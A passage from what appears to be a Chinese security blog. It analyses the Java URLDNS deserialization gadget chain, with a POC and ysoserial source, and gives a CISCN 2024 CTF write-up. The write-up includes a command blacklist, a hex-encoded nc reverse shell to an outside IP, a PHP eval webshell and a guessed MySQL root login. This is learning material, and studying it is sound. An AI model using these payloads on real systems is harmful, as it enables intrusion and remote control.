是一个用于在映射中插入键值对的函数。后两个布尔值参数典型地用于控制一些选项，比如是否要替换存在的值或者在插入时是否需要进行某些特殊处理。</li></ol></blockquote><p>重点看<code>putVal</code>方法，<code>putVal</code>是往HashMap中放入键值对的方法，这里调用了<code>hash</code>方法来处理key，跟进<code>hash</code>方法</p><h3 id="HashMap-hash"><a href="#HashMap-hash" class="headerlink" title="HashMap.hash()"></a>HashMap.hash()</h3><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span>(<span class="built_in">Object</span> <span class="built_in">key</span>) &#123;</span><br><span class="line">        <span class="type">int</span> h;</span><br><span class="line">        <span class="title function_">return</span> (<span class="built_in">key</span> == <span class="literal">null</span>) ? <span class="number">0</span> : (h = <span class="built_in">key</span>.<span class="property">hashCode</span>()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里就是检测传入的key是否为null，如果不为null则会调用key的hashCode方法，由于我们传入的key是java.net.URL的实例对象，自然会调用 URL 的 hashcode 方法，跟进一下hashcode方法</p><h3 id="URL-hashCode"><a href="#URL-hashCode" class="headerlink" title="URL.hashCode()"></a>URL.hashCode()</h3><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="function"><span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (hashCode != <span class="number">-1</span>)</span><br><span class="line">            <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">        hashCode = <span class="keyword">handler</span>.hashCode(<span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这个方法要求URL 实例的 hashCode 的值要为 - 1 它才能够调用 handler.hashCode，否则就会直接return该字段，其实在URL的前部分代码中已经声明了hashCode的值为-1</p><p><img src="https://bu.dusays.com/2024/06/24/66791d5079e6e.png" alt="image-20240516215257530.png"></p><p>跟进一下handler</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">transient</span> URLStreamHandler <span class="keyword">handler</span>; <span class="comment">//transient 关键字，修饰Java序列化对象时，不需要序列化的属性</span></span><br></pre></td></tr></table></figure><p>这里 handler 的类是 URLStreamHandler，继续跟进 URLStreamHandler 的 hashcode 方法</p><h3 id="URLStreamHandler-hashCode"><a href="#URLStreamHandler-hashCode" class="headerlink" title="URLStreamHandler.hashCode()"></a>URLStreamHandler.hashCode()</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the protocol part.</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">protocol</span> <span class="operator">=</span> u.getProtocol();</span><br><span class="line">        <span class="keyword">if</span> (protocol != <span class="literal">null</span>)</span><br><span class="line">            h += protocol.hashCode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the host part.</span></span><br><span class="line">        <span class="type">InetAddress</span> <span class="variable">addr</span> <span class="operator">=</span> getHostAddress(u);</span><br><span class="line">        <span class="keyword">if</span> (addr != <span class="literal">null</span>) &#123;</span><br><span class="line">            h += addr.hashCode();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> u.getHost();</span><br><span class="line">            <span class="keyword">if</span> (host != <span class="literal">null</span>)</span><br><span class="line">                h += host.toLowerCase().hashCode();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the file part.</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">file</span> <span class="operator">=</span> u.getFile();</span><br><span class="line">        <span class="keyword">if</span> (file != <span class="literal">null</span>)</span><br><span class="line">            h += file.hashCode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the port part.</span></span><br><span class="line">        <span class="keyword">if</span> (u.getPort() == -<span class="number">1</span>)</span><br><span class="line">            h += getDefaultPort();</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            h += u.getPort();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the ref part.</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">ref</span> <span class="operator">=</span> u.getRef();</span><br><span class="line">        <span class="keyword">if</span> (ref != <span class="literal">null</span>)</span><br><span class="line">            h += ref.hashCode();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> h;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>以上代码就是将传入的url的各个元素的哈希值加在h上，这里getHostAddress方法对传入的u值进行了处理，继续跟进getHostAddress</p><h3 id="URL-getHostAddress"><a href="#URL-getHostAddress" class="headerlink" title="URL.getHostAddress()"></a>URL.getHostAddress()</h3><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">synchronized InetAddress getHostAddress() &#123;</span><br><span class="line">        <span class="keyword">if</span> (hostAddress != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> hostAddress;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (host == <span class="literal">null</span> || host.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            hostAddress = InetAddress.getByName(host);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnknownHostException | SecurityException ex) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> hostAddress;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>host是我们传入的主机名，需要去查询 DNS 服务器以获取对应的 IP 地址，也就是进行了一次DNS查询，这里就是利用链的终点，下面开始构造poc</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>链子：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HashMap.readObject<span class="function"><span class="params">()</span> -&gt;</span>  HashMap.putVal<span class="function"><span class="params">()</span> -&gt;</span> HashMap.hash<span class="function"><span class="params">()</span> </span></span><br><span class="line"><span class="function">-&gt;</span> URL.hashCode<span class="function"><span class="params">()</span>-&gt;</span>URLStreamHandler.hashCode().getHostAddress</span><br><span class="line">-&gt;URLStreamHandler.hashCode().getHostAddress</span><br><span class="line">-&gt;URLStreamHandler.hashCode().getHostAddress.InetAddress.getByName</span><br></pre></td></tr></table></figure><p>poc：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();  <span class="comment">//创建一个HashMap实例</span></span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://gtxwkf.dnslog.cn&quot;</span>);  <span class="comment">//传入dns地址</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);  <span class="comment">//用反射获取URL实例的hashCode属性</span></span><br><span class="line">        f.setAccessible(<span class="literal">true</span>); <span class="comment">//URL中hashcode属性是private,所以这里用setAccessible打破封装,以便后续的利用</span></span><br><span class="line"></span><br><span class="line">        f.set(url,<span class="number">123</span>); <span class="comment">//修改hashcode的值为123,可以确保下次调用hashCode时重新执行计算,从而触发DNS查询</span></span><br><span class="line">        map.put(url,<span class="number">123</span>); <span class="comment">//调用HashMap对象中的put方法，此时因为hashcode不为-1，不再触发dns查询</span></span><br><span class="line">        f.set(url,-<span class="number">1</span>); <span class="comment">//将hashcode重新设置为-1，确保在反序列化成功触发</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//下面就是序列化和反序列化操作了</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser&quot;</span>));</span><br><span class="line">        oos.writeObject(map);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ysoserial的poc"><a href="#ysoserial的poc" class="headerlink" title="ysoserial的poc"></a>ysoserial的poc</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A blog post with more details about this gadget chain is at the url below:</span></span><br><span class="line"><span class="comment"> *   https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   This was inspired by  Philippe Arteau <span class="doctag">@h</span>3xstream, who wrote a blog</span></span><br><span class="line"><span class="comment"> *   posting describing how he modified the Java Commons Collections gadget</span></span><br><span class="line"><span class="comment"> *   in ysoserial to open a URL. This takes the same idea, but eliminates</span></span><br><span class="line"><span class="comment"> *   the dependency on Commons Collections and does a DNS lookup with just</span></span><br><span class="line"><span class="comment"> *   standard JDK classes.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   The Java URL class has an interesting property on its equals and</span></span><br><span class="line"><span class="comment"> *   hashCode methods. The URL class will, as a side effect, do a DNS lookup</span></span><br><span class="line"><span class="comment"> *   during a comparison (either equals or hashCode).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   As part of deserialization, HashMap calls hashCode on each key that it</span></span><br><span class="line"><span class="comment"> *   deserializes, so using a Java URL object as a serialized key allows</span></span><br><span class="line"><span class="comment"> *   it to trigger a DNS lookup.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   Gadget Chain:</span></span><br><span class="line"><span class="comment"> *     HashMap.readObject()</span></span><br><span class="line"><span class="comment"> *       HashMap.putVal()</span></span><br><span class="line"><span class="comment"> *         HashMap.hash()</span></span><br><span class="line"><span class="comment"> *           URL.hashCode()</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span></span><br><span class="line"><span class="meta">@PayloadTest(skip = &quot;true&quot;)</span></span><br><span class="line"><span class="meta">@Dependencies()</span></span><br><span class="line"><span class="meta">@Authors(&#123; Authors.GEBL &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Object&gt; &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">                <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">                <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line"></span><br><span class="line">                <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">                <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">                ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span></span><br><span class="line"><span class="comment">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span></span><br><span class="line"><span class="comment">         * using the serialized object.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span></span><br><span class="line"><span class="comment">         * second resolution.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里它自定义了一个<code>URLStreamHandler</code>的子类<code>SilentURLStreamHandler</code>，其覆盖了<code>openConnection</code>和<code>getHostAddress</code>方法，防止过程中创建URL实例时触发DNS查询，后续由于这个类是自定义的，被攻击者的JVM中不含这个类，仍会向其父类URLStreamHandler中调用方法，使得链子正常运行</p><p>参考文章：</p><p><a href="https://blog.csdn.net/Litsasuk/article/details/138537249?spm=1001.2014.3001.5502">https://blog.csdn.net/Litsasuk/article/details/138537249?spm=1001.2014.3001.5502</a></p><p><a href="https://www.cnblogs.com/N0r4h/p/15840776.html">https://www.cnblogs.com/N0r4h/p/15840776.html</a></p><p><a href="https://www.cnblogs.com/nice0e3/p/13772184.html">https://www.cnblogs.com/nice0e3/p/13772184.html</a></p><p><a href="https://xz.aliyun.com/t/9417?time__1311=n4+xuDgD9AYCqGKDQeDsR32rDc0rDBYhiDYqevD&alichlgref=https://cn.bing.com/#toc-1">https://xz.aliyun.com/t/9417?time__1311=n4%2BxuDgD9AYCqGKDQeDsR32rDc0rDBYhiDYqevD&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F#toc-1</a></p><p><a href="http://81.71.146.34/index.php/2024/03/18/urldns/">http://81.71.146.34/index.php/2024/03/18/urldns/</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2024-web复现</title>
      <link href="/2024/06/04/CISCN2024-web%E5%A4%8D%E7%8E%B0/"/>
      <url>/2024/06/04/CISCN2024-web%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="CISCN-2024-web复现"><a href="#CISCN-2024-web复现" class="headerlink" title="CISCN 2024 web复现"></a>CISCN 2024 web复现</h1><h2 id="simple-php（php-r进行rce、绕过escapeshellcmd、mysql数据库简单查询）"><a href="#simple-php（php-r进行rce、绕过escapeshellcmd、mysql数据库简单查询）" class="headerlink" title="simple_php（php -r进行rce、绕过escapeshellcmd、mysql数据库简单查询）"></a>simple_php（php -r进行rce、绕过escapeshellcmd、mysql数据库简单查询）</h2><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">ini_set(&#x27;open_basedir&#x27;, &#x27;/var/www/html/&#x27;);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset($_POST[&#x27;cmd&#x27;]))&#123;</span><br><span class="line">    $cmd = escapeshellcmd($_POST[&#x27;cmd&#x27;]); </span><br><span class="line">     <span class="keyword">if</span> (!preg_match(&#x27;/ls|<span class="type">dir</span>|<span class="type">nl</span>|<span class="type">nc</span>|<span class="type">cat</span>|<span class="type">tail</span>|<span class="type">more</span>|<span class="type">flag</span>|<span class="type">sh</span>|<span class="type">cut</span>|<span class="type">awk</span>|<span class="type">strings</span>|<span class="type">od</span>|<span class="type">curl</span>|<span class="type">ping</span>|<span class="type">\*|sort</span>|<span class="type">ch</span>|<span class="type">zip</span>|<span class="type">mod</span>|<span class="type">sl</span>|<span class="type">find</span>|<span class="type">sed</span>|<span class="type">cp</span>|<span class="type">mv</span>|<span class="type">ty</span>|<span class="type">grep</span>|<span class="type">fd</span>|<span class="type">df</span>|<span class="type">sudo</span>|<span class="type">more</span>|<span class="type">cc</span>|<span class="type">tac</span>|<span class="type">less</span>|<span class="type">head</span>|<span class="type">\.|&#123;|&#125;|tar</span>|<span class="type">zip</span>|<span class="type">gcc</span>|<span class="type">uniq</span>|<span class="type">vi</span>|<span class="type">vim</span>|<span class="type">file</span>|<span class="type">xxd</span>|<span class="type">base64</span>|<span class="type">date</span>|<span class="type">bash</span>|<span class="type">env</span>|<span class="type">\?|wget</span>|<span class="type">\&#x27;|\&quot;|id</span>|<span class="type">whoami</span>/i&#x27;, $cmd)) &#123;</span><br><span class="line">         system($cmd);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show_source(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>没见过<code>escapeshellcmd</code>函数，官方文档</p><p><img src="https://img.picui.cn/free/2024/06/04/665ef1188a6c6.png" alt="image-20240529142328905.png"></p><p>简单来说就是这个函数将所有和命令执行的函数都进行了转义</p><h3 id="法一：php-r"><a href="#法一：php-r" class="headerlink" title="法一：php -r"></a>法一：php -r</h3><p>这里可以用<code>php -r</code>来执行我们想要执行的代码</p><blockquote><p><code>php -r</code> 这个命令用于在命令行执行单行的 PHP 代码，<code>-r</code> 是一个 PHP 命令行选项，后面跟上的是直接执行的 PHP 代码。</p></blockquote><p>以上黑名单还没过滤system，可以结合php -r进行rce，引号可以用hex2bin绕过，hex2bin是php自带的一个函数，其作用是将包含数据的十六进制表示转换为字节串</p><p>这里存在一个问题，如果开头是数字的话，就会将类型识别为数字，后续出现除数字以外的字符例如字母就会报错，可以用substr函数来截取，这样返回的就是字符串，避免了报错</p><p>既然可以rce了就好打了，可以写马也可以弹shell，ctfshow的靶机bash好像弹不了，用nc弹</p><p><img src="https://img.picui.cn/free/2024/06/04/665ef1189c4a1.png" alt="屏幕截图 2024-05-29 150554.png"></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">cmd</span>=php -r <span class="variable">$a</span>=substr(Z6e63203132312e34302e3139352e3139342032333333202d65202f62696e2f7368,<span class="number">1</span>)<span class="comment">;system(hex2bin($a));</span></span><br></pre></td></tr></table></figure><p>还有一种写法</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">cmd</span>=php -r <span class="variable">$a</span>=substr(Z6e63203132312e34302e3139352e3139342032333333202d65202f62696e2f7368,<span class="number">1</span>)<span class="comment">;system(hex2bin($a));</span></span><br></pre></td></tr></table></figure><p>拿到shell后发现根目录下没有flag，而且其实用<code>paste /etc/passwd</code>可以看到有个mysql账户</p><p><img src="https://img.picui.cn/free/2024/06/04/665ef118a31fc.png" alt="屏幕截图 2024-05-29 151210.png"></p><p>而且用<code>mysql --version</code>可以看到mysql服务是开启的</p><p><img src="https://img.picui.cn/free/2024/06/04/665ef1189d69e.png" alt="屏幕截图 2024-05-29 151415.png"></p><p>这里猜测mysql的密码为root，在mysql数据库里找到flag</p><p><img src="https://img.picui.cn/free/2024/06/04/665ef1188a165.png" alt="屏幕截图 2024-05-29 152525.png"></p><blockquote><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">-uroot 指定了MySQL的用户名为 root</span></span><br><span class="line"><span class="deletion">-proot 指定了登录密码为 root</span></span><br><span class="line"><span class="deletion">-e 参数后面跟随要执行的 SQL 查询</span></span><br></pre></td></tr></table></figure></blockquote><p>写马的话，语句为</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">printf &#x27;</span><span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(\<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><span class="language-xml">&#x27; &gt; 1.php</span></span><br></pre></td></tr></table></figure><h3 id="法二：反斜杠-绕过"><a href="#法二：反斜杠-绕过" class="headerlink" title="法二：反斜杠 \ 绕过"></a>法二：反斜杠 <code>\</code> 绕过</h3><p>liunx中eval函数是将字符串当成命令来执行，即<code>eval l\\s</code>其实是相当于在终端中执行了<code>l\s</code>而在bash中会直接忽略这个反斜杠。即执行了ls。而我们在传入<code>eval l\s</code>经过escapeshellcmd()函数处理为<code>eval l\\s</code>这样waf是检测不到ls的但是可以命令执行。</p><p><img src="https://img.picui.cn/free/2024/06/04/665ef118e6964.png" alt="image-20240529161223486.png"></p><p>还有一种方法就是根据前面的内容猜测mysql里有东西，直接把数据库的所有内容打印出来再全局找flag</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -uroot -proot <span 